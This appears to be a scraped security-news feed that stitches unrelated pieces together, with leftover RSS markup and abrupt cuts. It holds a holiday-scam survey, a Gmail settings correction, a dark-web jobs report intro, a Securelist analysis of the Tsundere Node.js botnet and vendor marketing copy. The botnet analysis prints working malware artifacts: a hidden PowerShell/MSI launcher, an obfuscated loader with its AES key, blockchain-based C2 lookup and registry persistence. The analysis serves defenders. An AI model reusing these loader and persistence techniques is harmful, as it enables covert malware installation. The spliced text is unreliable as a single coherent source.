same instinct as legitimate deals: the urge to grab a bargain before it disappears.Scams show up wherever people shop. As holiday buying moves across social feeds, messaging apps, and mobile alerts, scammers follow the traffic.Social platforms have become informal online malls: buy/sell groups, influencer offers, and limited-time stories all blur the line between social and shopping.57% have bought from a buy/sell/trade group53% have used a platform like Facebook Marketplace or OfferUp38% have DM’d a company or seller for a discountIt’s a familiar environment, and that’s the problem. Fake listings and ads sit right beside real ones, making it hard to tell them apart when you’re scrolling fast. Half of people (51%) encounter scams on social media every week, and 1 in 4 (27%) see at least one scam a day.Shopping has become social. It’s quick, conversational, and built on trust. But that same trust leads to some of the most common holiday scams.A little skepticism when shopping via your social feeds can go a long way, especially when deals and deadlines make everything feel more urgent.Three scams shoppers should watch out forExposure to scams is baked into the modern shopping experience—especially across social platforms and mobile marketplaces. Here are three common types that surge during the holidays.Marketplace scams are one of the most common traps during the holidays, precisely because they hide in plain sight. Shoppers tend to feel safe on familiar platforms, whether that’s a buy-and-sell group, a resale page, or a trusted marketplace app. But fake listings, spoofed profiles, and too-good-to-miss deals are everywhere.Around a third of people (36%) come across a marketplace scam weekly (15% are targeted daily), and roughly 1 in 10 have fallen victim. Younger users are hit hardest: Gen Z and Millennials are the most impacted age group—70% of victims are Gen Z/Millennial (vs 57% victims overall). They also are more likely to lose money after clicking a fake ad or transferring payment for an item that never arrives. The result is a perfect storm of trust, speed, and urgency. The very ingredients scammers rely on.Marketplace scams don’t just drain bank accounts, they also take a personal toll. Many victims describe the experience as financially and emotionally exhausting, with some losing money they can’t recover, others discovering new accounts opened in their name, and some even locked out of their own. For others, the impact spreads further: embarrassment over being tricked, stress at work, and health problems triggered by anxiety or sleepless nights.Postal tracking scams are already mainstream, but the holidays invite particular risk. With shoppers checking delivery updates several times a day, it’s easy to click without thinking. Around 4 in 10 people have encountered one of these scams (62%), and more than 8 in 10 track packages directly from their phones (83%), making mobile users a prime target. Again, younger shoppers are the most impacted with 62% of victims being either Gen Z or Millennials (vs 57% of scam victims overall).The messages look convincing: real courier logos, legitimate-sounding tracking numbers, and language that mirrors official updates.A single click on what looks like a delivery confirmation can lead to a fake login page, a malicious download, or a request for personal information. It’s one of the simplest, most believable scams out there—and one of the easiest to fall for when you’re juggling gifts, deadlines, and constant delivery alerts.The hunt for flash sales, coupon codes, and last-minute deals can make shoppers more exposed to malicious ads and downloads.More than half of people (58%) have encountered ad-related malware (or, “adware”, which is software that floods your screen with unwanted ads or tracks what you click to profit from your data), and over a quarter have fallen victim (27%). Gen Z users who spend the most time online are the age bracket that are most susceptible to adware, at nearly 40%.Others scams involve malvertising, where criminals plant malicious code inside online ads that look completely legitimate, and just loading the page can be enough to start the attack. Malvertising too tends to spike during the holiday rush, when people are scrolling quickly through social feeds or searching for discounts. Forty percent of people have been targeted by malvertising and 11% have fallen victim. Adware targets 45% of people, claiming 20% as victims.Fake ads are designed to look just like the real thing, complete with familiar branding and countdown timers. One wrong tap can install a malicious “shopping helper” app, redirect to a phishing site, or trigger a background download you never meant to start. It’s a reminder that even the most legitimate-looking ads deserve a second glance before you click.Why shoppers drop their guardThe holidays bring joy but also a lot of pressure. There’s the financial strain, endless to-do lists, and that feeling that you don’t have enough time to do it all. Scammers know this, and use urgency, stress, and even guilt to make you click before you think. And when people do fall for a scam, the financial impact isn’t the only upsetting thing. Victims of scams are often embarrassed and blame themselves, and then have the stress of picking up the pieces.Most shoppers worry about being scammed (61%) or losing money (73%), but with constant notifications, flashing ads, and countdown timers competing for attention, even the most careful shoppers can click before they check. Scammers count on that moment of distraction—and they only need one.Mobile-first shopping has become second nature, and during the holidays it’s faster and more frantic than ever. Fifty-five percent of people get a scam text message weekly, while 27% are targeted daily.Downloading new apps, checking delivery updates, or tapping limited-time offers all feel routine. Nearly 6 in 10 people say that downloading apps to buy products or engage with companies is now a way of life, and 39% admit they’re more likely to click a link on their phone than on their laptop.How to shop smarter (and safer) this holidayMost people don’t have protections that match the pace of holiday shopping, but the good news is, small steps make a big difference.Keep an eye on your accounts. Make it a habit to glance over your bank or credit statements during the holidays. Spotting unexpected activity early is one of the simplest ways to stop fraud before it snowballs.Add strong login protections. Use unique passwords, or a passkey, for your main shopping and payment accounts, and turn on two-factor authentication wherever it’s offered. It takes seconds to set up and can stop someone from breaking in, even if they have your password.Guard against malicious ads and fake apps. Scam sites and pop-ups tend to spike during busy shopping periods, hiding behind flash sales or delivery updates. Malwarebytes Mobile Security and Malwarebytes Browser Guard can block these pages before they load, keeping scam domains, fake coupons, and malvertising out of sight and out of reach.Be careful about where you share personal details, especially for “free” offers or surveys. If something asks for more information than it needs, it’s probably not worth the risk. Using identity protection tools adds an extra layer of defense if your data ever does end up in the wrong hands.A few minutes of setup now can save you days of stress later. Shop smart, stay skeptical, and enjoy the season safely.The research in this article is based on a March 2025 survey prepared by an independent research consultant and distributed via Forsta among n=1,300 survey respondents ages 18 and older in the United States, UK, Austria, Germany and Switzerland.

The settings themselves aren’t new, but the way Google recently rewrote and surfaced them led a lot of people (including us) to believe Gmail content might be used to train Google’s AI models, and that users were being opted in automatically. After taking a closer look at Google’s documentation and reviewing other reporting, that doesn’t appear to be the case.Gmail does scan email content to power its own “smart features,” such as spam filtering, categorisation, and writing suggestions. But this is part of how Gmail normally works and isn’t the same as training Google’s generative AI models. Google also maintains that these feature settings are opt-in rather than opt-out, although users’ experiences seem to vary depending on when and how the new wording appeared.It’s easy to see where the confusion came from. Google’s updated language around “smart features” is vague, and the term “smart” often implies AI—especially at a time when Gemini is being integrated into other parts of Google’s products. When the new wording started appearing for some users without much explanation, many assumed it signalled a broader shift.We’ve revised this article to reflect what we can confirm from Google’s documentation, as it’s always been our aim to give readers accurate, helpful guidance.Google has updated some Gmail settings around how its “smart features” work, which control how Gmail analyses your messages to power built-in functions.According to reports we’ve seen, Google has started automatically opting users in to allow Gmail to access all private messages and attachments for its smart features. This means your emails are analyzed to improve your experience with Chat, Meet, Drive, Email and Calendar products. However, some users are now reporting that these settings are switched on by default instead of asking for explicit opt-in—although Google’s help page states that users are opted-out for default.  How to check your settingsOpting in or out requires you to change settings in two places, so I’ve tried to make it as easy to follow as possible.

Since then, the job market has shifted, along with the expectations and requirements placed on professionals. However, recruitment and headhunting on the dark web remain active.So, what does this job market look like today? This report examines how employment and recruitment function on the dark web, drawing on 2,225 job-related posts collected from shadow forums between January 2023 and June 2025. Our analysis shows that the dark web continues to serve as a parallel labor market with its own norms, recruitment practices and salary expectations, while also reflecting broader global economic shifts. Notably, job seekers increasingly describe prior work experience within the shadow economy, suggesting that for many, this environment is familiar and long-standing.The majority of job seekers do not specify a professional field, with 69% expressing willingness to take any available work. At the same time, a wide range of roles are represented, particularly in IT. Developers, penetration testers and money launderers remain the most in-demand specialists, with reverse engineers commanding the highest average salaries. We also observe a significant presence of teenagers in the market, many seeking small, fast earnings and often already familiar with fraudulent schemes.While the shadow market contrasts with legal employment in areas such as contract formality and hiring speed, there are clear parallels between the two. Both markets increasingly prioritize practical skills over formal education, conduct background checks and show synchronized fluctuations in supply and demand.Looking ahead, we expect the average age and qualifications of dark web job seekers to rise, driven in part by global layoffs. Ultimately, the dark web job market is not isolated — it evolves alongside the legitimate labor market, influenced by the same global economic forces.In this report, you’ll find:Demographics of the dark web job seekersTop specializations on the dark webComparison between legal and shadow job markets]]></content:encoded></item><item><title>Blockchain and Node.js abused by Tsundere: an emerging botnet</title><link>https://securelist.com/tsundere-node-js-botnet-uses-ethereum-blockchain/117979/</link><author>Lisandro Ubiedo</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/11/17103518/tsundere-botnet-featured-image-150x150.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 10:00:13 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[Tsundere is a new botnet, discovered by our Kaspersky GReAT around mid-2025. We have correlated this threat with previous reports from October 2024 that reveal code similarities, as well as the use of the same C2 retrieval method and wallet. In that instance, the threat actor created malicious Node.js packages and used the Node Package Manager (npm) to deliver the payload. The packages were named similarly to popular packages, employing a technique known as typosquatting. The threat actor targeted libraries such as Puppeteer, Bignum.js, and various cryptocurrency packages, resulting in 287 identified malware packages. This supply chain attack affected Windows, Linux, and macOS users, but it was short-lived, as the packages were removed and the threat actor abandoned this infection method after being detected.The threat actor resurfaced around July 2025 with a new threat. We have dubbed it the Tsundere bot after its C2 panel. This botnet is currently expanding and poses an active threat to Windows users.Currently, there is no conclusive evidence on how the Tsundere bot implants are being spread. However, in one documented case, the implant was installed via a Remote Monitoring and Management (RMM) tool, which downloaded a file named  from a compromised website. In other instances, the sample names suggest that the implants are being disseminated using the lure of popular Windows games, particularly first-person shooters. The samples found in the wild have names such as “valorant”, “cs2”, or “r6x”, which appear to be attempts to capitalize on the popularity of these games among piracy communities.According to the C2 panel, there are two distinct formats for spreading the implant: via an MSI installer and via a PowerShell script. Implants are automatically generated by the C2 panel (as described in the Infrastructure section).The MSI installer was often disguised as a fake installer for popular games and other software to lure new victims. Notably, at the time of our research, it had a very low detection rate.The installer contains a list of data and JavaScript files that are updated with each new build, as well as the necessary Node.js executables to run these scripts. The following is a list of files included in the sample:nodejs/B4jHWzJnlABB2B7
nodejs/UYE20NBBzyFhqAQ.js
nodejs/79juqlY2mETeQOc
nodejs/thoJahgqObmWWA2
nodejs/node.exe
nodejs/npm.cmd
nodejs/npx.cmd
The last three files in the list are legitimate Node.js files. They are installed alongside the malicious artifacts in the user’s  directory.An examination of the CustomAction table reveals the process by which Windows Installer executes the malware and installs the Tsundere bot:RunModulesSetup 1058    NodeDir powershell -WindowStyle Hidden -NoLogo -enc JABuAG[...]ACkAOwAiAA==
After Base64 decoding, the command appears as follows:$nodePath = "$env:LOCALAPPDATA\nodejs\node.exe";
& $nodePath  - e "const { spawn } = require('child_process'); spawn(process.env.LOCALAPPDATA + '\\nodejs\\node.exe', ['B4jHWzJnlABB2B7'], { detached: true, stdio: 'ignore', windowsHide: true, cwd: __dirname }).unref();"
This will execute Node.js code that spawns a new Node.js process, which runs the loader JavaScript code (in this case, ). The resulting child process runs in the background, remaining hidden from the user.The loader script is responsible for ensuring the correct decryption and execution of the main bot script, which handles npm unpackaging and configuration. Although the loader code, similar to the code for the other JavaScript files, is obfuscated, it can be deobfuscated using open-source tools. Once executed, the loader attempts to locate the unpackaging script and configuration for the Tsundere bot, decrypts them using the AES-256 CBC cryptographic algorithm with a build-specific key and IV, and saves the decrypted files under different filenames.encScriptPath = 'thoJahgqObmWWA2',
  encConfigPath = '79juqlY2mETeQOc',
  decScript = 'uB39hFJ6YS8L2Fd',
  decConfig = '9s9IxB5AbDj4Pmw',
  keyBase64 = '2l+jfiPEJufKA1bmMTesfxcBmQwFmmamIGM0b4YfkPQ=',
  ivBase64 = 'NxrqwWI+zQB+XL4+I/042A==',
[...]
    const h = path.dirname(encScriptPath),
      i = path.join(h, decScript),
      j = path.join(h, decConfig)
    decryptFile(encScriptPath, i, key, iv)
    decryptFile(encConfigPath, j, key, iv)
The configuration file is a JSON that defines a directory and file structure, as well as file contents, which the malware will recreate. The malware author refers to this file as “config”, but its primary purpose is to package and deploy the Node.js package manager (npm) without requiring manual installation or downloading. The unpackaging script is responsible for recreating this structure, including the  directory with all its libraries, which contains packages necessary for the malware to run.With the environment now set up, the malware proceeds to install three packages to the  directory using npm:: a WebSocket networking library: a library for communicating with Ethereum: a Node.js process management toolLoader script installing the necessary toolset for Tsundere persistence and executionThe  package is installed to ensure the Tsundere bot remains active and used to launch the bot. Additionally,  helps achieve persistence on the system by writing to the registry and configuring itself to restart the process upon login.The PowerShell version of the infector operates in a more compact and simplified manner. Instead of utilizing a configuration file and an unpacker — as done with the MSI installer — it downloads the ZIP file node-v18.17.0-win-x64.zip from the official Node.js website  and extracts it to the  directory, ultimately deploying Node.js on the targeted device. The infector then uses the AES-256-CBC algorithm to decrypt two large hexadecimal-encoded variables, which correspond to the bot script and a persistence script. These decrypted files, along with a  file are written to the disk. The  file contains information about the malicious Node.js package, as well as the necessary libraries to be installed, including the  and  packages. Finally, the infector runs both scripts, starting with the persistence script that is followed by the bot script.The PowerShell infector creates a package file with the implant dependenciesPersistence is achieved through the same mechanism observed in the MSI installer: the script creates a value in the HKCU:\Software\Microsoft\Windows\CurrentVersion\Run registry key that points to itself. It then overwrites itself with a new script that is Base64 decoded. This new script is responsible for ensuring the bot is executed on each login by spawning a new instance of the bot.We will now delve into the Tsundere bot, examining its communication with the command-and-control (C2) server and its primary functionality.Web3 contracts, also known as smart contracts, are deployed on a blockchain via transactions from a wallet. These contracts can store data in variables, which can be modified by functions defined within the contract. In this case, the Tsundere botnet utilizes the Ethereum blockchain, where a method named  is defined to modify the state variable , allowing it to store a string. The string stored in  is used by the Tsundere botnet administrators to store new WebSocket C2 servers, which can be rotated at will and are immutable once written to the Ethereum blockchain.The Tsundere botnet relies on two constant points of reference on the Ethereum blockchain:Wallet: 0x73625B6cdFECC81A4899D221C732E1f73e504a32Contract: 0xa1b40044EBc2794f207D45143Bd82a1B86156c6bIn order to change the C2 server, the Tsundere botnet makes a transaction to update the state variable with a new address. Below is a transaction made on August 19, 2025, with a value of 0 ETH, which updates the address.Smart contract containing the Tsundere botnet WebSocket C2The state variable has a fixed length of 32 bytes, and a string of 24 bytes (see item [2] in the previous image) is stored within it. When this string is converted from hexadecimal to ASCII, it reveals the new WebSocket C2 server address: ws[:]//185.28.119[.]179:1234.To obtain the C2 address, the bot contacts various public endpoints that provide remote procedure call (RPC) APIs, allowing them to interact with Ethereum blockchain nodes. At the start of the script, the bot calls a function named , which iterates through a list of RPC providers. For each provider, it checks the transactions associated with the contract address and wallet owner, and then retrieves the string from the state variable containing the WebSocket address, as previously observed.Malware code for retrieval of C2 from the smart contractThe Tsundere bot verifies that the C2 address starts with either  or  to ensure it is a valid WebSocket URL, and then sets the obtained string as the server URL. But before using this new URL, the bot first checks the system locale by retrieving the culture name of the machine to avoid infecting systems in the CIS region. If the system is not in the CIS region, the bot establishes a connection to the server via a WebSocket, setting up the necessary handlers for receiving, sending, and managing connection states, such as errors and closed sockets.Bot handlers for communicationThe communication flow between the client (Tsundere bot) and the server (WebSocket C2) is as follows:The Tsundere bot establishes a WebSocket connection with the retrieved C2 address.An AES key is transmitted immediately after the connection is established.The bot sends an empty string to confirm receipt of the key.The server then sends an IV, enabling the use of encrypted communication from that point on.
Encryption is required for all subsequent communication.The bot transmits the OS information of the infected machine, including the MAC address, total memory, GPU information, and other details. This information is also used to generate a unique identifier (UUID).The C2 server responds with a JSON object, acknowledging the connection and confirming the bot’s presence.With the connection established, the client and server can exchange information freely.
To maintain the connection, keep-alive messages are sent every minute using ping/pong messages.The bot sends encrypted responses as part of the ping/pong messages, ensuring continuous communication.Tsundere communication process with the C2 via WebSocketsThe connections are not authenticated through any additional means, making it possible for a fake client to establish a connection.As previously mentioned, the client sends an encrypted ping message to the C2 server every minute, which returns a pong message. This ping-pong exchange serves as a mechanism for the C2 panel to maintain a list of currently active bots.The Tsundere bot is designed to allow the C2 server to send dynamic JavaScript code. When the C2 server sends a message with  to the bot, the message is evaluated as a new function and then executed. The result of this operation is sent back to the server via a custom function named , which is responsible for transmitting the result as a JSON object, encrypted for secure communication.Tsundere bot evaluation code once functions are received from the C2The ability to evaluate code makes the Tsundere bot relatively simple, but it also provides flexibility and dynamism, allowing the botnet administrators to adapt it to a wide range of actions.However, during our observation period, we did not receive any commands or functions from the C2 server, possibly because the newly connected bot needed to be requested by other threat actors through the botnet panel before it could be utilized.The Tsundere bot utilizes WebSocket as its primary protocol for establishing connections with the C2 server. As mentioned earlier, at the time of writing, the malware was communicating with the WebSocket server located at , and our tests indicated that it was responding positively to bot connections.The following table lists the IP addresses and ports extracted from the provided list of URLs:First seen (contract update)Marketplace and control panelNo business is complete without a marketplace, and similarly, no botnet is complete without a control panel. The Tsundere botnet has both a marketplace and a control panel, which are integrated into the same frontend.Tsundere botnet panel loginThe notable aspect of Tsundere’s control panel, dubbed “Tsundere Netto” (version 2.4.4), is that it has an open registration system. Any user who accesses the login form can register and gain access to the panel, which features various tabs:Bots: a dashboard displaying the number of bots under the user’s controlSettings: user settings and administrative functionsBuild: if the user has an active license, they can create new bots using the two previously mentioned methodologies (MSI or PowerShell)Market: this is the most interesting aspect of the panel, as it allows users to promote their individual bots and offer various services and functionalities to other threat actors. Each build can create a bot that performs a specific set of actions, which can then be offered to othersMonero wallet: a wallet service that enables users to make deposits or withdrawalsSocks proxy: a feature that allows users to utilize their bots as proxies for their trafficTsundere botnet control panel, building system and marketEach build generates a unique build ID, which is embedded in the implant and sent to the C2 server upon infection. This build ID can be linked to the user who created it. According to our research and analysis of other URLs found in the wild, builds are created through the panel and can be downloaded via the URL:hxxps://idk.1f2e[REDACTED]07a4[.]net/api/builds/{BUILD-ID}.msi.
At the time of writing this, the panel typically has between 90 and 115 bots connected to the C2 server at any given time.Based on the text found in the implants, we can conclude with high confidence that the threat actor behind the Tsundere botnet is likely Russian-speaking. The use of the Russian language in the implants is consistent with previous attacks attributed to the same threat actor.Russian being used throughout the codeFurthermore, our analysis suggests a connection between the Tsundere botnet and the 123 Stealer, a C++-based stealer available on the shadow market for $120 per month. This connection is based on the fact that both panels share the same server. Notably, the main domain serves as the frontend for the 123 Stealer panel, while the subdomain “idk.” is used for the Tsundere botnet panel.123 Stealer C2 panel sharing Tsundere’s infrastructure and showcasing its authorBy examining the available evidence, we can link both threats to a Russian-speaking threat actor known as “koneko”. Koneko was previously active on a dark web forum, where they promoted the 123 Stealer, as well as other malware, including a backdoor. Although our analysis of the backdoor revealed that it was not directly related to Tsundere, it shared similarities with the Tsundere botnet in that it was written in Node.js and used PowerShell or MSI as infectors. Before the dark web forum was seized and shut down, koneko’s profile featured the title “node malware senior”, further suggesting their expertise in Node.js-based malware.The Tsundere botnet represents a renewed effort by a presumably identified threat actor to revamp their toolset. The Node.js-based bot is an evolution of an attack discovered in October of last year, and it now features a new strategy and even a new business model. Infections can occur through MSI and PowerShell files, which provides flexibility in terms of disguising installers, using phishing as a point of entry, or integrating with other attack mechanisms, making it an even more formidable threat.Additionally, the botnet leverages a technique that is gaining popularity: utilizing web3 contracts, also known as “smart contracts”, to host command-and-control (C2) addresses, which enhances the resilience of the botnet infrastructure. The botnet’s possible author, koneko, is also involved in peddling other threats, such as the 123 Stealer, which suggests that the threat is likely to escalate rather than diminish in the coming months. As a result, it is essential to closely monitor this threat and be vigilant for related threats that may emerge in the near future.

so analysts focus on true threats.Recorded Future advantage: Recorded Future’s Intelligence Cloud delivers automated threat protection through real-time data collection, machine learning analysis, and seamless integrations with tools like SIEM, SOAR, and EDR.Future-ready defense: AI and ML algorithms adapt to new attack patterns, enabling predictive threat detection and rapid response.Introduction: The Need for Speed in CybersecurityCyber threats are expanding in volume, complexity, and velocity. Enterprises receive thousands of security alerts every single day, and human analysts manually collecting and correlating threat data can’t keep up. These reactive workflows lead to slow threat detection and delayed response, giving attackers more time to cause damage. The result is not only missed attacks but also burned-out analysts, who face constant alert fatigue and repetitive tasks.When a breach can unfold in minutes, organizations can’t afford hours (or days) of lag. Threat intelligence automation allows security teams to respond to indicators of compromise (IOCs) within seconds, stopping attacks before they spread—and reducing the potential financial and reputational damages from a breach. The push for speed has spurred a rise in AI and automation across cybersecurity as security leaders increasingly recognize how real-time, autonomous decisions can bolster defense.What Is Automated Threat Protection?Automated threat protection, also known as autonomous threat protection, refers to the use of advanced technologies—including AI and ML—to continuously gather, analyze, and act on threat intelligence without manual intervention. It streamlines the entire threat intelligence lifecycle, from data collection to detection to response, at machine speed.Core capabilities of automated threat protection platforms include ingesting data from diverse sources (open web, dark web, technical feeds, internal logs, etc.), automatically correlating and analyzing threat signals, and triggering protective actions or alerts. Key functions often include real-time monitoring for IOCs, enrichment of alerts with contextual data, automated risk scoring of threats, and even initiating response workflows via SOAR (Security Orchestration, Automation, and Response) playbooks. These systems excel at processing information at a scale and speed impossible for human operators.To illustrate the difference: in a manual workflow, if a new phishing domain targeting your company is discovered, an analyst might spend precious time gathering WHOIS information, checking threat feeds for references, assessing the domain’s legitimacy, and then coordinating a response. By the time this manual analysis is done, the phishing campaign could have claimed victims. In contrast, automated threat protection can instantly recognize the suspicious domain, enrich the alert with WHOIS data and threat actor profiles, check if the domain appears in malware or phishing databases, and even automatically block the domain via integrated security controls, all before a human even starts investigating.How Threat Intelligence Automation Enhances Real-Time Security DecisionsFaster Detection and ResponseAutomation enables security teams to detect threats or intrusions within moments of their emergence. By automatically correlating internal logs with external intelligence feeds, an automated system can spot malicious activity and trigger a response in machine time. This might mean isolating a compromised host or alerting on a zero-day exploit mere seconds after it’s observed. The net effect is that incidents are contained before they escalate widely.Intelligent automation learns what “normal” looks like in an environment and filters out the noise of benign events or erroneous alerts. Over time, machine learning models can identify patterns of false positives and automatically dismiss or deprioritize them. By letting automation sift signal from noise, human analysts can reclaim hours of wasted time and focus attention on genuine threats.Improved Threat PrioritizationAutomated threat intelligence tools provide rich context around each indicator or alert instantly. For example, when an alert comes in, an automation system might automatically append information about the involved IP’s reputation, associated malware, threat actor groups, prevalence in the wild, and more. This contextual enrichment allows the system to assess which alerts pose the greatest risk.Consistent, round-the-clock protectionAutomated systems never sleep, operating 24/7 with consistency and scaling to handle surges in threat activity. This around-the-clock monitoring means critical warnings are never missed and aligns security operations to the always-on nature of cyber attacks. Automation also enforces consistency in how threats are handled; a playbook executed by a machine will run the same way every time, reducing the variability (and potential errors) of human responses.Recorded Future’s Approach to Automated Threat ProtectionRecorded Future’s Intelligence Cloud is a SaaS platform that delivers real-time, automated threat intelligence at scale. It continuously collects billions of data points from across the open web, dark web, technical sources (like malware feeds and network telemetry), as well as insights from Recorded Future’s own research team, Insikt Group®. All of this data is analyzed and risk-scored in real time using machine learning algorithms.A key strength of Recorded Future’s approach is seamless integration. The Intelligence Cloud connects directly with popular SIEM, SOAR, EDR, and Threat Intelligence Platform (TIP) tools. This means when your SOC’s SIEM generates an alert, Recorded Future automatically enriches that alert with context within the tool you’re already using. If an alert about a suspicious IP comes into your SIEM, the Intelligence Cloud can, in real time, append that IP’s risk score, known associations, or related domains—even triggering automated response playbooks in your SOAR platform based on its intelligence.Recorded Future’s platform assigns risk scores to IOCs in real time, using analytics that weigh factors like novelty, prevalence, and severity of associated threat activity. So when an alert involving a particular IOC hits a SOC, the Intelligence Cloud has already flagged it as high risk and enriched it with context, such as the ransomware family or threat actor.Recorded Future’s approach centers on delivering actionable insight in real time and automating wherever possible. Teams can trust they’re never operating on out-of-date information, and that many threat defense actions are happening autonomously at machine speed.Example use cases include: Suppose a new phishing email campaign targeting a financial institution is identified. Recorded Future’s Intelligence Cloud can automatically spot the phishing domains or URLs as soon as they appear on phishing feeds or dark web forums, immediately flagging them as malicious, enriching them with context, and integrating with your email security or firewall to block them.Vulnerability prioritization: Recorded Future’s automation helps organizations stay ahead by tracking vulnerability disclosures and exploit chatter continuously. If a new critical vulnerability is published, the Intelligence Cloud will instantly assess if there are exploit kits or threat actors discussing it. Through integrations, it can automatically create a ticket in your ITSM or send an alert to your vulnerability management dashboard highlighting that this CVE is under active attack and should be prioritized.Benefits of Adopting Recorded Future for Automated Threat ProtectionSpeed and Scale in Decision-MakingThrough automation, organizations can make security decisions at a speed and scale that human teams alone cannot match. Threats are identified, contextualized, and even countered in real time. This machine-speed detection and response means attacks can be thwarted before they escalate into major incidents, compressing the threat response timeline from what might be hours or days down to minutes.Better Resource AllocationWhen you automate data gathering and initial threat analysis, skilled personnel are freed up to focus on what they do best: in-depth investigations, incident response, threat hunting, and security strategy. This not only improves job satisfaction but also means your team’s expertise is directed at tasks that truly require human judgement. This often leads to cost savings or the ability to handle more threats with the same headcount.Continuous Monitoring With Global VisibilityRecorded Future provides continuous, 24/7 monitoring of threats worldwide. It’s like having an around-the-clock sentry that never takes a break. Organizations gain insight into emerging threats and external risks relevant to them, no matter where those threats originate. If a threat actor in another part of the world starts planning attacks against your industry, Recorded Future’s platform may pick up on early warning signs and automatically alert you. This means you’re not only monitoring your internal environment but also the external horizon for incoming risks, all through an automated system.Reduced time to detect and respondUltimately, adopting an automated threat intelligence solution like Recorded Future dramatically reduces the Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR) for security incidents. Automated response or enrichment means incidents can be contained or remediated far faster. A faster detection/response cycle directly correlates with minimizing damage—the quicker you intercept an attack, the less harm it can do. If you can cut your detection time from the industry average of ~200 days down to near real-time, you potentially save millions in breach costs.Strengthened security postureBy integrating real-time insights and automated actions into daily operations, organizations can close security gaps and achieve a more consistent defense posture. Automation ensures that no critical threat intelligence is missed or ignored, and that defenses are applied uniformly across the board. Moreover, automation enforces best practices automatically, ensuring processes are followed correctly every time. All of this leads to a significant uplift in an organization’s ability to prevent breaches and handle incidents effectively.Practical Applications and Use CasesModern threat intelligence platforms can automatically detect and surface indicators of compromise that matter to your organization. Rather than relying on an analyst to manually find a malicious IP or file hash buried in feeds, automation pulls these out in real time. If chatter about a new malware hash or command-and-control server related to your industry appears on a dark web forum, for example, the system will immediately flag it, ensuring you learn of emerging threats the moment they arise.Threat Hunting with Automated EnrichmentThreat hunters and researchers greatly benefit from automation when investigating suspicious events. Suppose an analyst is digging into an odd network beacon that might indicate a hidden attacker. With automated enrichment tools, they can get additional context in seconds, such as domain reputation, related threats, or historical occurrences of that indicator. The analyst enters the indicator and the platform aggregates intelligence from open source feeds, commercial intel, and internal data. This on-demand enrichment provides deeper insights instantly, improving both the speed and accuracy of threat hunts.Proactive Defense Through Vulnerability IntelligenceRather than playing catch-up after hackers exploit a vulnerability, organizations can use threat intelligence automation to stay ahead of exploits. Automated systems continuously track CVEs, exploit releases, and even discussions on hacking forums about particular software weaknesses. When something relevant to your tech stack pops up, the system will alert you and provide threat context (e.g., known exploits or ransomware leveraging that CVE). This proactive vulnerability intelligence means you can patch or implement mitigations before an attack hits.Banks and financial institutions face constant phishing, fraud, and account takeover attempts. Threat intelligence automation helps instantly flag things like fraudulent banking websites impersonating the institution, or dumps of customer credentials on the dark web. If a fake banking login page is spun up to phish customers, an automated system can detect that site and raise an alert before any customers fall victim. Similarly, automation assists in fraud detection by correlating internal transaction anomalies with known threat patterns in real time. If a series of suspicious money transfers aligns with a known fraud tactic described in threat intel reports, the system can bring it to analysts’ attention immediately.Government agencies and defense organizations are high-value targets for state-sponsored cyber attacks. Threat intelligence automation gives these SOCs an upper hand by continuously scanning for indicators of nation-state campaigns targeting them. For instance, an automated platform might monitor for malware signatures, spear-phishing themes, or infrastructure known to be used by groups hostile to a particular country. The moment something matching those patterns is found, the system immediately alerts the security team. This real-time awareness is critical for government SOCs to mobilize defenses against advanced threats.Hospitals and healthcare providers are frequently targeted by ransomware, data theft, and other cyberattacks that can literally put lives at risk. Automated threat intelligence in healthcare monitors for signs of impending attacks and provides early warnings. If an underground forum post indicates interest in exploiting a particular healthcare software, the security team can be alerted to fortify that system preemptively. This sector also benefits from automation in disrupting criminal activities: for example, automated systems can detect illicit online marketplaces selling stolen patient data or fake pharmaceutical websites that could harm public trust.Future of Threat Intelligence AutomationAs cyber threats evolve, automated defense systems will evolve alongside them, becoming self-learning. In the near future, these systems could autonomously adjust detection thresholds or even launch countermeasures based on learned experience, further reducing the need for human tuning. Recorded Future is at the forefront of this trend, embedding advanced AI into its Intelligence Cloud for capabilities like predictive risk scoring, anomaly detection at scale, and automated decision support. The vision is that intelligence automation becomes an indispensable co-pilot for every security team, helping humans make better decisions faster.However, it’s important to note that attackers are also embracing AI to automate and enhance their attacks. In response, defensive AI systems are being developed to spot AI-generated threats and respond at machine speed. In this escalating battle, organizations that invest early in threat intelligence automation and AI will possess the agile, self-updating defenses needed to counter AI-augmented cyber attacks.Start Protecting Your Business With Threat Intelligence Automation TodayCyber attacks are accelerating and evolving on a daily basis.
